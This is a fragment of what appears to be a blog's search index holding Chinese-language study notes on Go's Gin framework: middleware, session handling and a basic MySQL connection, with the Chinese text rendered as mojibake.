<td><code>r.Use(middleware)``group.Use(middleware)</code></td>
<td>å…¨å±€æˆ–å±€éƒ¨ï¼ˆæŸä¸ªåˆ†ç»„ï¼‰ä½¿ç”¨</td>
</tr>
<tr>
<td><strong>å®šä¹‰æ–¹å¼</strong></td>
<td><code>go&lt;br&gt;func MyMiddleware() gin.HandlerFunc &#123;&lt;br&gt;  return func(c *gin.Context) &#123;&lt;br&gt;    // å‰ç½®é€»è¾‘&lt;br&gt;    c.Next()&lt;br&gt;    // åç½®é€»è¾‘&lt;br&gt;  &#125;&lt;br&gt;&#125;</code></td>
<td><code>c.Next()</code> æ§åˆ¶æ˜¯å¦ç»§ç»­åç»­å¤„ç†</td>
</tr>
<tr>
<td><strong>ç»ˆæ­¢è¯·æ±‚</strong></td>
<td><code>c.Abort()</code> &#x2F; <code>c.AbortWithStatus()``c.AbortWithStatusJSON()</code></td>
<td>ä¸­æ­¢åç»­ä¸­é—´ä»¶ä¸ handler æ‰§è¡Œ</td>
</tr>
<tr>
<td><strong>è·å–è¯·æ±‚ä¿¡æ¯</strong></td>
<td><code>c.Request.URL``c.Request.Header.Get(&quot;X-Token&quot;)``c.ClientIP()</code></td>
<td>å¸¸ç”¨äºæ—¥å¿—ã€è®¤è¯ã€é™æµç­‰åœºæ™¯</td>
</tr>
<tr>
<td><strong>è®¾ç½®ä¸Šä¸‹æ–‡å€¼</strong></td>
<td><code>c.Set(&quot;key&quot;, value)</code> â†’ handler ä¸­ <code>c.Get(&quot;key&quot;)</code></td>
<td>åœ¨å¤šä¸ªä¸­é—´ä»¶&#x2F;å¤„ç†å™¨ä¸­å…±äº«æ•°æ®</td>
</tr>
<tr>
<td><strong>å¸¸è§å†…ç½®ä¸­é—´ä»¶</strong></td>
<td><code>gin.Logger()``gin.Recovery()</code></td>
<td>Logger è®°å½•è¯·æ±‚ä¿¡æ¯ï¼›Recovery æ•è· panic é˜²æ­¢ç¨‹åºå´©æºƒ</td>
</tr>
<tr>
<td><strong>è‡ªå®šä¹‰æ—¥å¿—ä¸­é—´ä»¶</strong></td>
<td><code>go&lt;br&gt;func LoggerMiddleware() gin.HandlerFunc &#123;&lt;br&gt;  return func(c *gin.Context) &#123;&lt;br&gt;    start := time.Now()&lt;br&gt;    c.Next()&lt;br&gt;    log.Printf(&quot;è€—æ—¶: %v&quot;, time.Since(start))&lt;br&gt;  &#125;&lt;br&gt;&#125;</code></td>
<td>è¾“å‡ºå¤„ç†æ—¶é—´ï¼Œå¯åŠ ä¸Š IPã€è·¯å¾„ç­‰ä¿¡æ¯</td>
</tr>
<tr>
<td><strong>IP æ ¡éªŒä¸­é—´ä»¶ç¤ºä¾‹</strong></td>
<td><code>go&lt;br&gt;func ValidateIP() gin.HandlerFunc &#123;&lt;br&gt;  return func(c *gin.Context) &#123;&lt;br&gt;    if c.ClientIP() != &quot;127.0.0.1&quot; &#123;&lt;br&gt;      c.AbortWithStatusJSON(403, gin.H&#123;&quot;error&quot;: &quot;ç¦æ­¢è®¿é—®&quot;&#125;)&lt;br&gt;    &#125;&lt;br&gt;  &#125;&lt;br&gt;&#125;</code></td>
<td>æ‹’ç»éæ³• IP è®¿é—®ï¼Œå¸¸ç”¨äºå†…éƒ¨æ¥å£</td>
</tr>
</tbody></table>
<h3 id="7-ä¼šè¯æ§åˆ¶"><a href="#7-ä¼šè¯æ§åˆ¶" class="headerlink" title="7. ä¼šè¯æ§åˆ¶:"></a>7. ä¼šè¯æ§åˆ¶:</h3><p>sessionæ§åˆ¶:</p>
<table>
<thead>
<tr>
<th>åŠŸèƒ½</th>
<th>ç”¨æ³•ç¤ºä¾‹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>ğŸ”§ æ³¨å†Œä¸­é—´ä»¶</td>
<td><code>store := cookie.NewStore([]byte(&quot;secret&quot;))``r.Use(sessions.Sessions(&quot;session&quot;, store))</code></td>
<td>ç»‘å®š session ä¸­é—´ä»¶ï¼Œè®¾ç½®åŠ å¯†å¯†é’¥</td>
</tr>
<tr>
<td>âœ… è·å– session å¯¹è±¡</td>
<td><code>session := sessions.Default(c)</code></td>
<td>è·å–å½“å‰è¯·æ±‚çš„ session å®ä¾‹</td>
</tr>
<tr>
<td>ğŸ“ è®¾ç½®é”®å€¼</td>
<td><code>session.Set(&quot;key&quot;, &quot;value&quot;)</code></td>
<td>ä¿å­˜æ•°æ®åˆ° sessionï¼ˆéœ€ <code>Save()</code>ï¼‰</td>
</tr>
<tr>
<td>ğŸ’¾ ä¿å­˜ session</td>
<td><code>session.Save()</code></td>
<td>ä¿®æ”¹ session åå¿…é¡»è°ƒç”¨ï¼Œæ‰èƒ½å†™å…¥</td>
</tr>
<tr>
<td>ğŸ“– è·å–å€¼</td>
<td><code>val := session.Get(&quot;key&quot;)</code></td>
<td>è¿”å› <code>interface&#123;&#125;</code>ï¼Œéœ€ç±»å‹æ–­è¨€</td>
</tr>
<tr>
<td>âŒ åˆ é™¤æŸä¸ªé”®</td>
<td><code>session.Delete(&quot;key&quot;)``session.Save()</code></td>
<td>åˆ é™¤åéœ€ä¿å­˜</td>
</tr>
<tr>
<td>ğŸ§¹ æ¸…ç©ºæ‰€æœ‰</td>
<td><code>session.Clear()``session.Save()</code></td>
<td>æ¸…ç©º session ä¸­çš„æ‰€æœ‰å†…å®¹</td>
</tr>
<tr>
<td>ğŸ” è·å–æ‰€æœ‰é”®</td>
<td><code>session.Keys()</code></td>
<td>è¿”å›å½“å‰ session çš„æ‰€æœ‰é”®å</td>
</tr>
<tr>
<td>âš ï¸ åˆ¤æ–­æ˜¯å¦å­˜åœ¨</td>
<td><code>val := session.Get(&quot;key&quot;); if val != nil &#123;...&#125;</code></td>
<td>åˆ¤æ–­ session æ˜¯å¦å­˜åœ¨æŸé¡¹æ•°æ®</td>
</tr>
</tbody></table>
<h2 id="6-æ•°æ®åº“"><a href="#6-æ•°æ®åº“" class="headerlink" title="6.æ•°æ®åº“:"></a>6.æ•°æ®åº“:</h2><h3 id="1-è¿æ¥"><a href="#1-è¿æ¥" class="headerlink" title="1.è¿æ¥:"></a>1.è¿æ¥:</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> _ &quot;github.com/go-sql-driver/mysql&quot;è¡¨ç¤ºå¯¼å…¥å®‰è£…çš„ä¾èµ–ï¼ŒMysqlæ•°æ®åº“é©±åŠ¨ï¼Œï¼Œå‰é¢åŠ ä¸€ä¸ªä¸‹åˆ’çº¿ï¼Œè¡¨ç¤ºå¯¼å…¥åŒ…ä½†æ˜¯ä¸ä½¿ç”¨ï¼Œç›¸å½“äºinitï¼ˆï¼‰åˆå§‹åŒ–ã€‚      <span class="comment">---å¿…é¡»åŠ </span></span><br><span class="line"> </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>ç”¨æˆ·å:å¯†ç å•Š<span class="variable">@tcp</span>(ip:ç«¯å£)<span class="operator">/</span>æ•°æ®åº“çš„åå­—</span><br><span class="line">dsn :<span class="operator">=</span> &quot;root:123@tcp(127.0.0.1:3306)/test&quot;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>è¿æ¥æ•°æ®é›†</span><br><span class="line">db, err :<span class="operator">=</span> sql.Open(&quot;mysql&quot;, dsn) <span class="operator">/</span><span class="operator">/</span><span class="keyword">open</span>ä¸ä¼šæ£€éªŒç”¨æˆ·åå’Œå¯†ç </span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>è¯­è¨€å­¦ä¹ </tag>
        <tag>golang</tag>
      </tags>
  </entry>
</search>
